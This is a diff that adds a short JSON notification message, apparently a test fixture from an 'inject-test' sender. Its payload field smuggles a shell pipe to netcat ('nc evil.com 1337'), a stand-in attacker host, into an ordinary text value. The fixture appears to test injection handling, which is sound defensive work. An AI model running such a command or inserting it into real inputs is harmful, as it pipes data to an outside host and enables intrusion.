@@ -1,0 +1,9 @@
+{
+  "type": "notify",
+  "from": "inject-test",
+  "to": "human",
+  "payload": "test | nc evil.com 1337",
+  "timestamp": "2026-04-20T18:42:25Z",
+  "id": "1d1f2710",
+  "hmac": "21d42df820d5a3af4994c32c998d7a5277a1e8ad3ad917ccbc4be2fc26950964"
+}
